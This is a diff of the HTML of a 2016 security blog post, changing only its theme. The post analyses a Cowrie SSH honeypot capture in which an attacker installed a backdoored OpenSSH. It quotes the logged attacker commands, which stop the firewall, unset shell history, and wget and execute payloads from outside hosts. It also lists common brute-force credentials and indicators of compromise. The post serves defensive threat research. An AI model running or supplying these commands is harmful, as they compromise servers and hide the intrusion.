@@ -1,108 +1,153 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="Tek" />
-    
-    <link rel="shortcut icon" type="image/x-icon" href="https://www.randhome.io/img/favicon.ico">
-    <title>Openssh backdoor used on compromised Linux servers</title>
-    <meta name="generator" content="Hugo 0.68.2" />
-    <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/bootstrap-3.3.7.min.css"/>
-    <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/main.css" />
-    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
-    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,400,200bold,400old" />
-    
-    <!--[if lt IE 9]>
-			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-		<![endif]-->
 
+<head>
+  <title>Openssh backdoor used on compromised Linux servers | </title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="">
+  <meta name="keywords" content="malware , openssh , backdoor , linux">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Openssh backdoor used on compromised Linux servers" />
+  <meta name="twitter:description" content=""
+  />
+  <meta name="twitter:site" content="@https://twitter.com/tenacioustek" />
+  <meta name="twitter:creator" content="@https://twitter.com/tenacioustek" />
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+  
+  
+    
+ 
+  
+  
+
+  
+
+  
+    
+    <link rel="stylesheet" href="/css/post.min.21eb6e3468d53804c2b0e8ddaba4e2b2370255bdc46c2829b696d5134c017ad5.css" integrity="sha256-IetuNGjVOATCsOjdq6TisjcCVb3EbCgptpbVE0wBetU="/>
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
+  
+
+  
+   
     
 
-    
-    
-    
-    
-    <link rel="canonical" href="https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/" />
-  </head>
+<script type="application/ld+json">
+  
+    { 
+      "@context": "http://schema.org", 
+      "@type": "WebSite", 
+      "url": "https:\/\/randhome.io\/blog\/2016\/08\/01\/openssh-backdoor-used-on-compromised-linux-servers\/",
+      "name": "Openssh backdoor used on compromised Linux servers",
+      "author": {
+        "@type": "Person",
+        "name": ""
+      },
+      "description": ""
+    }
+  
+  </script>
+</head>
 
-  <body>
-    <div id="wrap">
-      
-      <nav class="navbar navbar-default">
-    <div class="container">
-        <div class="navbar-header">
-            <a class="navbar-brand" href="https://www.randhome.io/"><i class="fa fa-home"></i></a>
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar">
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-        </div>
-        <div class="navbar-collapse collapse" id="navbar">
-            <ul class="nav navbar-nav navbar-right">
-                
-                    
-                        <li><a href="/post/">BLOG</a></li>
-                    
-                        <li><a href="/resources/">RESOURCES</a></li>
-                    
-                
-                <li class="lang-switcher dropdown">
-                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" lang="en"><span class="lang"> <i class="fa fa-language"></i> EN </span></a>
-                     <ul class="dropdown-menu">
-                         
-                            
-                                
-                            
-                                
-                                <li><a href="/fr" lang="fr" class="no-translation">FR</a></li>
-                                
-                            
-                        
-                     </ul>
-                </li>
-            </ul>
-        </div>
-    </div>
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+
+
+  <nav class="nav" role="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+          
+          
+        <a  href="/">home</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  class="active" href="/post/">blog</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/projects/">projects</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/resources/">resources</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/about/">about</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/contact/">contact</a>
+      </li>
+    
+    <li></li>
+    <li>
+        
+        EN
+        
+        
+        
+            <a href="/fr" lang="fr" class="no-translation">FR</a>
+        
+        
+    </li>
+  </ul>
 </nav>
 
-      
-      <div class="container">
-        <div class="blog-post">
-          <h2>
-            <strong><a href="https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/">Openssh backdoor used on compromised Linux servers</a></strong>
-          </h2>
-        </div>
-        <div class="blog-title">
-          <h4>
-              August 1, 2016  &middot; 6 minutes read 
-            &nbsp;&nbsp;
-            
-            <span class="taglist">
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/malware">malware</a>
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/linux">linux</a>
-                
-            </span>
-            
-          </h4>
-        </div>
-        <div class="panel panel-default">
-          <div class="panel-body">
-            <div class="blogpost">
-              <p>Olà,</p>
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">Openssh backdoor used on compromised Linux servers</h1>
+            <time datetime="2016-08-01 14:53:42 &#43;0200 CEST" class="post__date">1 Aug 2016   &middot; 6 minutes read </time>
+          </header>
+          <article class="post__content">
+              
+<p>Olà,</p>
 <p>Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the <a href="https://github.com/cowrie/cowrie">cowrie</a> ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check <a href="https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian">here</a> to install it).</p>
-<!-- raw HTML omitted -->
-<h2 id="cowrie-ssh">Cowrie ssh</h2>
+<h2 id="cowrie-ssh">Cowrie ssh<a class="anchor" href="#cowrie-ssh">#</a></h2>
 <p>This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">43</span>:<span style="color:#ae81ff">04</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17996</span>,<span style="color:#ae81ff">177.124</span><span style="color:#f92672">.</span><span style="color:#ae81ff">226.37</span>] login attempt [bayvit<span style="color:#f92672">/</span>bayvit] failed
 <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">44</span>:<span style="color:#ae81ff">42</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17997</span>,<span style="color:#ae81ff">177.124</span><span style="color:#f92672">.</span><span style="color:#ae81ff">226.37</span>] login attempt [explore<span style="color:#f92672">/</span>explore] failed
-<span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">45</span>:<span style="color:#ae81ff">11</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17998</span>,<span style="color:#ae81ff">106.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">116.239</span>] login attempt [jonathan<span style="color:#f92672">/</span><span style="color:#ae81ff">111111</span>] failed</code></pre></div>
-<p>Here is a short top 20 of most used users and passwords :</p>
+<span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">45</span>:<span style="color:#ae81ff">11</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17998</span>,<span style="color:#ae81ff">106.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">116.239</span>] login attempt [jonathan<span style="color:#f92672">/</span><span style="color:#ae81ff">111111</span>] failed
+</code></pre></div><p>Here is a short top 20 of most used users and passwords :</p>
 <p><strong>Top 20 users</strong></p>
 <ul>
 <li>root</li>
@@ -149,18 +194,18 @@
 <li>qwerty</li>
 <li>user</li>
 </ul>
-<p>Successfull attacks often juste download a malicious script/binary and execute it:
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">HoneyPotTransport,<span style="color:#ae81ff">110774</span>,<span style="color:#ae81ff">121.12</span><span style="color:#f92672">.</span><span style="color:#ae81ff">173.62</span>] CMD: <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>init<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span>iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget <span style="color:#f92672">-</span>c http:<span style="color:#f92672">//</span><span style="color:#ae81ff">222.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.5</span>:<span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>China1991;chmod <span style="color:#ae81ff">755</span> China1991;<span style="color:#f92672">./</span>China1991;</code></pre></div></p>
-<h2 id="what-are-those-files">What are those files?!?</h2>
-<p>Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:
+<p>Successfull attacks often juste download a malicious script/binary and execute it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">HoneyPotTransport,<span style="color:#ae81ff">110774</span>,<span style="color:#ae81ff">121.12</span><span style="color:#f92672">.</span><span style="color:#ae81ff">173.62</span>] CMD: <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>init<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span>iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget <span style="color:#f92672">-</span>c http:<span style="color:#f92672">//</span><span style="color:#ae81ff">222.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.5</span>:<span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>China1991;chmod <span style="color:#ae81ff">755</span> China1991;<span style="color:#f92672">./</span>China1991;
+</code></pre></div><h2 id="what-are-those-files">What are those files?!?<a class="anchor" href="#what-are-those-files">#</a></h2>
+<p>Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">19</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] login attempt [root<span style="color:#f92672">/</span>root123] succeeded
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] root authenticated <span style="color:#66d9ef">with</span> keyboard<span style="color:#f92672">-</span>interactive
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] starting service ssh<span style="color:#f92672">-</span>connection
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>connection on HoneyPotTransport,<span style="color:#ae81ff">111016</span>, <span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] got channel session request
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHChannel session (<span style="color:#ae81ff">0</span>) on SSHService ssh<span style="color:#f92672">-</span>connection on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] channel open
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHChannel session (<span style="color:#ae81ff">0</span>) on SSHService ssh<span style="color:#f92672">-</span>connection on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] pty request: xterm (<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
-[SNIP]</code></pre></div></p>
-<p>The cowrie log is pretty long because&hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&rsquo;t implement all the shell commands), and in the end the interesting one:
+[SNIP]
+</code></pre></div><p>The cowrie log is pretty long because&hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&rsquo;t implement all the shell commands), and in the end the interesting one:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unset HISTFILE
 unset HISTSAVE
 unset SAVEFILE
@@ -178,8 +223,8 @@ ls -la
 wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
 ls -la
 cd ..
-rm -rf ssh</code></pre></div></p>
-<p>Here the attacker doesn&rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.</p>
+rm -rf ssh
+</code></pre></div><p>Here the attacker doesn&rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.</p>
 <p>Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on <a href="https://github.com/Te-k/openssh-backdoor">github</a> if you want to check by yourself)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cat v
 OpenSSH_4.3p2, OpenSSL 0.9.8b <span style="color:#ae81ff">04</span> May <span style="color:#ae81ff">2006</span>
@@ -278,7 +323,7 @@ record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="c
 }
 
 </code></pre></div><p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
-<h2 id="lets-do-threat-intelligence">Lets do Threat Intelligence</h2>
+<h2 id="lets-do-threat-intelligence">Lets do Threat Intelligence<a class="anchor" href="#lets-do-threat-intelligence">#</a></h2>
 <p>So let&rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).</p>
 <p>This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).</p>
 <p>I have learnt recently that the <a href="https://www.dshield.org/">SANS Dshield Group</a> collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called <a href="https://github.com/jkakavas/kippo-pyshield">kippo-pyshield</a> to do this).</p>
@@ -305,7 +350,7 @@ record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="c
 &lt;/ip&gt;
 </code></pre><p>So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).</p>
 <p>The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&rsquo;t use any common framework (I contacted the owner, no answer yet).</p>
-<h2 id="iocs">IOCs</h2>
+<h2 id="iocs">IOCs<a class="anchor" href="#iocs">#</a></h2>
 <p>It&rsquo;s not the new super-duper fancy APT group attack, but I like how <a href="https://twitter.com/malware_traffic">Brad</a> ends <a href="http://www.malware-traffic-analysis.net/">his posts</a> with a summary of what to check on your system, so here is a short summary:</p>
 <ul>
 <li>Bruteforce IP : 37.228.227.119</li>
@@ -316,49 +361,96 @@ record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="c
 <p>I&rsquo;m still on <a href="https://twitter.com/tenacioustek">Twitter</a> if you have any comment.</p>
 <p>Ciao</p>
 
-              
-            </div>
-          </div>
-          <hr>
-        
 
-        </div>
+              
+          </article>
+          
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="https://randhome.io/blog/2016/07/16/machine-learning-for-malware-detection/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">Machine learning for malware detection</span>
+    </a>
+  
+
+  
+    <a class="pagination__item" href="https://randhome.io/blog/2017/04/23/lets-talk-about-flexispy/">
+      <span class="pagination__label">Next Post</span>
+      <span class="pagination__title" >Let&#39;s Talk About FlexiSpy</a>
+    </a>
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+    
+    
+      <a class="social-icons__icon" title="Twitter"
+         style="background-image: url(/images/social/twitter.svg)"
+         href="https://twitter.com/tenacioustek"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+      <a class="social-icons__icon" title="GitHub"
+         style="background-image: url(/images/social/github.svg)"
+         href="https://github.com/Te-k"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+      <a class="social-icons__icon" title="Email"
+         style="background-image: url(/images/social/email.svg)"
+         href="mailto:tek@randhome.io"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+</div>
+
+            <p>© 2020</p>
+          </footer>
+          </div>
       </div>
       
     </div>
 
-    
-    <footer>
-  <div id="footer">
-    <div class="container">
-        
-            <p class="text-muted">
-                
-                    <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons Licence" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/3.0/80x15.png" /></a>
-                
-                Powered by <a href="https://gohugo.io/">Hugo</a> and <a href="http://www.github.com/nurlansu/hugo-sustain/">sustain</a>
-                
-                    
-                    
-                    
-                
-            </p>
-        
-    </div>
-  </div>
-</footer>
-<div class="footer"></div>
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
+  
+  
 
 
-<script src="https://www.randhome.io/js/jquery-1.11.3.min.js"></script>
+</body>
 
-<script src="https://www.randhome.io/js/bootstrap-3.3.7.min.js"></script>
-<script src="https://www.randhome.io/js/docs.min.js"></script>
-<script src="https://www.randhome.io/js/main.js"></script>
-
-<script src="https://www.randhome.io/js/ie10-viewport-bug-workaround.js"></script>
-
-
-
-  </body>
 </html>
